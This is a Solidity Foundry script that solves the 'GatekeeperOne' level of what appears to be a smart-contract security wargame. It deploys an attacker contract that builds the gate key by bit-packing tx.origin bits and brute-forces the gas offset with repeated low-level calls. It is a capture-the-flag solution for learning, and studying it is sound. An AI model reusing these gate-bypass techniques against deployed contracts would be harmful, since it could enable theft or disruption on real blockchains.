// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "src/levels/GatekeeperOne/GatekeeperOne.sol";
import "forge-std/Script.sol";

contract GatekeeperOneAttackScript is Script {
    function setUp() public {}

    function run() public {
        GatekeeperOne target = GatekeeperOne(0x0000000000000000000000000000000000000000); // Insert instance target address

        vm.startBroadcast();
        // Deploy new attacker contract
        GatekeeperOneAttack attacker = new GatekeeperOneAttack(target);

        // Trigger attack
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract GatekeeperOneAttack {
    GatekeeperOne public gatekeeperOne;

    constructor(GatekeeperOne  _gatekeeperOne) payable {
        gatekeeperOne = _gatekeeperOne;
    }

    function attack() public {
        bytes8 gateKey = bytes8(abi.encodePacked(uint32(1), uint16(0), uint16(uint160(msg.sender))));
        bytes memory data = abi.encodeCall(GatekeeperOne.enter, gateKey);
        for (uint256 i = 200; i < 450; i++) {
            (bool success ,) = address(gatekeeperOne).call{gas: i + 8191 * 4}(data);
            if (success) {
                break;
            }
        }
    }
}